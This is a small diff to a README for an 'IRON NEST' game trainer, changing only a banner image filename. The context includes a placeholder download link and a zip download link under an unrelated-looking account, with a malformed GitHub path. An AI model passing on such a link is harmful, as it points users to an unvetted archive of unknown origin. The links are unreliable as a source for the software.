@@ -12,7 +12,7 @@
 > **[⬇ Download the latest IRON NEST trainer](https://github.com/YOUR-USERNAME/iron-nest-trainer/releases/latest)**
 <p align="center">
     <a href="https://github.com/Crushflalead/FlintDelivererTube/IRON-NEST-Trainer/releases/latest/download/IRONNESTtrainer.zip">
-        <img src="assets/banner.png" width="100%" alt="Download IRON NEST Trainer">
+        <img src="assets/banner1.png" width="100%" alt="Download IRON NEST Trainer">
     </a>
 </p>
 ---
